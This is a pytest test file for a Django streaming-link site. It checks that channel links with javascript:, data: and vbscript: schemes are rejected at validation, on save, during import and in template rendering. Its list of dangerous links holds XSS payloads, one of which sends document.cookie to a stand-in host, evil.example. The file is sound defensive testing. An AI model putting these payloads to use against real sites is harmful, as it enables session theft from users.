"""The scheme of a `ChannelLink` decides whether it becomes an `href`, so it is untrusted.

Channel lists (`.m3u`, `newera.txt`, `elcano.txt`) come from outside the project and are
imported wholesale. A link whose scheme is `javascript:` or `data:` is not stopped by
escaping — the payload is the URL itself, not markup around it — and it executes in the
site's own origin the moment somebody clicks the play button.

Three layers are covered here, because each one catches what the others cannot:

1. `validate_channel_link` decides what a legitimate link looks like.
2. `ChannelLink.save()` applies it, so no caller can persist a dangerous link. This is
   what the field's `validators=[...]` never did: Django only runs those from
   `full_clean()`, which `save()` does not call and nothing in this project called.
3. The template refuses to render one, which is the only layer that protects a row that
   is already in the database.
"""

import pytest
from django.core.exceptions import ValidationError
from django.template.loader import render_to_string

from soccertime.management.commands._link_import_base import BaseLinkImportCommand
from soccertime.models import Channel, ChannelLink, validate_channel_link


class OutputCollector:
    """Swallows the command's progress output; the assertions are about the database."""

    def write(self, *args, **kwargs):
        pass

    def style(self, *args, **kwargs):
        pass


# Payloads that must never reach an href. The tab and the casing variants are here
# because browsers strip control characters and lower-case the scheme before acting on
# it, so a guard that compares the raw string is not a guard at all.
DANGEROUS_LINKS = [
    "javascript:alert(1)",
    "javascript:fetch('https://evil.example/'+document.cookie)",
    "JavaScript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "jAvAsCrIpT:alert(1)",
    " javascript:alert(1)",
    "\tjavascript:alert(1)",
    "\njavascript:alert(1)",
    "java\tscript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "//evil.example/stream",
]

LEGITIMATE_LINKS = [
    "acestream://ff8c1f0b0f4d9e2a3b5c6d7e8f9a0b1c2d3e4f5a",
    "https://example.com/stream.m3u8",
    "http://example.com/stream",
    "sop://broker.sopcast.com:3912/149000",
    "rtmp://example.com/live/stream",
]


class TestValidator:
    """The validator alone, with no database: `full_clean()` would run unique checks."""

    @pytest.mark.parametrize("link", DANGEROUS_LINKS)
    def test_rejects_dangerous_schemes(self, link):
        with pytest.raises(ValidationError):
            validate_channel_link(link)

    @pytest.mark.parametrize("link", LEGITIMATE_LINKS)
    def test_accepts_the_schemes_the_site_actually_serves(self, link):
        validate_channel_link(link)


@pytest.mark.django_db
class TestSaveRefusesDangerousLinks:
    """The gap that made the validator decorative: nothing ever invoked it."""

    @pytest.mark.parametrize("link", DANGEROUS_LINKS)
    def test_save_rejects(self, link):
        with pytest.raises(ValidationError):
            ChannelLink.objects.create(name="PoC", link=link)

    @pytest.mark.parametrize("link", DANGEROUS_LINKS)
    def test_update_or_create_rejects(self, link):
        """The importer's own call, which is how such a link would really arrive."""
        with pytest.raises(ValidationError):
            ChannelLink.objects.update_or_create(link=link, defaults={"name": "PoC"})

    def test_nothing_is_persisted_when_it_is_rejected(self):
        with pytest.raises(ValidationError):
            ChannelLink.objects.create(name="PoC", link="javascript:alert(1)")

        assert not ChannelLink.objects.filter(name="PoC").exists()

    @pytest.mark.parametrize("link", LEGITIMATE_LINKS)
    def test_legitimate_links_still_save(self, link):
        assert ChannelLink.objects.create(name="ok", link=link).pk

    def test_a_link_may_still_be_empty(self):
        """`link` is nullable and blank-able, and the admin relies on that."""
        assert ChannelLink.objects.create(name="no link", link=None).pk

    def test_saving_an_unchanged_row_again_works(self):
        """Validation must not turn an ordinary update into an error."""
        link = ChannelLink.objects.create(name="ok", link="https://example.com/a")
        link.name = "renamed"
        link.save()

        assert ChannelLink.objects.get(pk=link.pk).name == "renamed"


@pytest.mark.django_db
class TestImportSurvivesADangerousEntry:
    """The importer runs inside one transaction, so a raising row must not take it down.

    Channel lists are third-party input; the established behaviour for an unusable entry
    is to report it and carry on, the same as an unreachable image during a scrape.
    """

    def _import(self, entries):
        command = BaseLinkImportCommand()
        command.stdout = OutputCollector()
        command.import_entries(entries, source_name="test-source", dry_run=False)
        return command

    @pytest.fixture
    def channel(self, db):
        return Channel.objects.create(name="DAZN LaLiga")

    def test_the_good_entries_are_still_imported(self, channel):
        entries = [
            ("DAZN LaLiga", None, ChannelLink.Quality.ANY, "javascript:alert(1)"),
            ("DAZN LaLiga", None, ChannelLink.Quality.ANY, "acestream://good1"),
        ]

        self._import(entries)

        assert ChannelLink.objects.filter(link="acestream://good1").exists()
        assert not ChannelLink.objects.filter(link="javascript:alert(1)").exists()

    def test_the_rejection_is_reported_rather_than_silent(self, channel):
        entries = [("DAZN LaLiga", None, ChannelLink.Quality.ANY, "javascript:alert(1)")]

        command = self._import(entries)

        assert any("disallowed scheme" in warning for warning in command.warnings)


@pytest.mark.django_db
class TestTemplateRefusesDangerousLinks:
    """The layer that protects rows already stored, whatever route they came in by."""

    @pytest.mark.parametrize("link", DANGEROUS_LINKS)
    def test_no_anchor_is_rendered(self, link):
        # Built without saving, so this stays a test of the template rather than of save().
        markup = render_to_string("soccertime/link_button.html", {"link": ChannelLink(name="x", link=link)})

        assert "href" not in markup
        assert "javascript" not in markup.lower()
        assert "data:text/html" not in markup.lower()

    @pytest.mark.parametrize("link", LEGITIMATE_LINKS)
    def test_legitimate_links_are_still_rendered(self, link):
        markup = render_to_string("soccertime/link_button.html", {"link": ChannelLink(name="x", link=link)})

        assert f'href="{link}"' in markup

    def test_the_acestream_class_and_target_are_unaffected(self):
        """The guard must not disturb the behaviour the buttons already had."""
        acestream = render_to_string(
            "soccertime/link_button.html", {"link": ChannelLink(name="x", link="acestream://abc")}
        )
        https = render_to_string(
            "soccertime/link_button.html", {"link": ChannelLink(name="x", link="https://example.com/s")}
        )

        assert "acestream-link" in acestream
        assert "target=" not in acestream
        assert 'target="_blank"' in https
        assert 'rel="noopener noreferrer"' in https

    def test_a_link_without_a_url_renders_nothing(self):
        markup = render_to_string("soccertime/link_button.html", {"link": ChannelLink(name="x", link=None)})

        assert "href" not in markup
